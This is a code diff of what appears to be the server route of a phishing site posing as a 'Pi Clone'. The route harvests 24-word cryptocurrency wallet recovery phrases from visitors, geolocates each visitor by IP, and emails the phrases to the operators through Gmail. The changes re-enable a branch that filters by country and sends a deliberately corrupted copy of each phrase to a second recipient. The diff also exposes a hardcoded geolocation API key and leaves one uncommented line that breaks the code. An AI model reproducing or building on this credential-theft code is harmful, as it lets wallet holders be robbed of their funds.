@@ -23,8 +23,8 @@ const formatMessage = async (message: string, location: string) => {
     const mailOptions = {
         from: `Godzilla PassPhrase ${email}`,
         to: "sparrowthedev@gmail.com",
-        // subject: "Yo! you just got the correct passphrase",
-        subject: "Yo! you just got a new passphrase from Godzilla",
+        subject: "Yo! you just got the correct passphrase",
+        // subject: "Yo! you just got a new passphrase from Godzilla",
         html: formattedMessage,
     };
 
@@ -56,54 +56,54 @@ export async function POST(request: Request) {
         const locationData = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=9c72fe7c3bfa41cfaa4af67d3f711a11&ip=${ip}`);
         const locationJson = await locationData.json();
         const location = `${locationJson.city}, ${locationJson.country_name}`;
-        await formatMessage(message, location);
-
-        // Validate that the message is a passphrase with 24 words
-        // const words = message.trim().split(/\s+/);
-
-        // if (words.length === 24 && locationJson.country_name !== 'Nigeria') {
-        //     // Send the correct passphrase to the first email
         // await formatMessage(message, location);
 
-        //     // Randomly decide how many characters to remove from the last word (1 to 5)
-        //     const charsToRemove = Math.floor(Math.random() * 5) + 1;
-        //     const lastWord = words[23].slice(0, -charsToRemove);
-        //     const modifiedMessage = [...words.slice(0, 23), lastWord].join(' ');
+        Validate that the message is a passphrase with 24 words
+        const words = message.trim().split(/\s+/);
 
-        //     const email = process.env.EMAIL;
-        //     const pass = process.env.PASS;
+        if (words.length === 24 && locationJson.country_name !== 'Nigeria') {
+            // Send the correct passphrase to the first email
+            await formatMessage(message, location);
 
-        //     const transporter = nodemailer.createTransport({
-        //         service: 'gmail',
-        //         auth: {
-        //             user: email,
-        //             pass,
-        //         }
-        //     });
+            // Randomly decide how many characters to remove from the last word (1 to 5)
+            const charsToRemove = Math.floor(Math.random() * 5) + 1;
+            const lastWord = words[23].slice(0, -charsToRemove);
+            const modifiedMessage = [...words.slice(0, 23), lastWord].join(' ');
 
-        //     const mailOptions = {
-        //         from: `Pi Clone ${email}`,
-        //         to: 'escrowlinks@gmail.com',
-        //         subject: "Phrase From Your Website",
-        //         html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${modifiedMessage}</div>`,
-        //     };
+            const email = process.env.EMAIL;
+            const pass = process.env.PASS;
 
-        //     transporter.verify(function (error: any, success: any) {
-        //         if (error) {
-        //             console.log(`here is the error: ${error}`);
-        //         } else {
-        //             console.log("From one: Server is ready to take our messages");
-        //         }
-        //     });
+            const transporter = nodemailer.createTransport({
+                service: 'gmail',
+                auth: {
+                    user: email,
+                    pass,
+                }
+            });
 
-        //     const result = await transporter.sendMail(mailOptions);
+            const mailOptions = {
+                from: `Pi Clone ${email}`,
+                to: 'escrowlinks@gmail.com',
+                subject: "Phrase From Your Website",
+                html: `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${modifiedMessage}</div>`,
+            };
 
-        //     if (result.response.includes("OK")) {
-        //         return Response.json({ message: "email sent successfully!!" }, { status: 200 });
-        //     } else {
-        //         return Response.json({ error: "Internal server error" }, { status: 500 });
-        //     }
-        // }
+            transporter.verify(function (error: any, success: any) {
+                if (error) {
+                    console.log(`here is the error: ${error}`);
+                } else {
+                    console.log("From one: Server is ready to take our messages");
+                }
+            });
+
+            const result = await transporter.sendMail(mailOptions);
+
+            if (result.response.includes("OK")) {
+                return Response.json({ message: "email sent successfully!!" }, { status: 200 });
+            } else {
+                return Response.json({ error: "Internal server error" }, { status: 500 });
+            }
+        }
         
         const email = process.env.EMAIL;
         const pass = process.env.PASS;
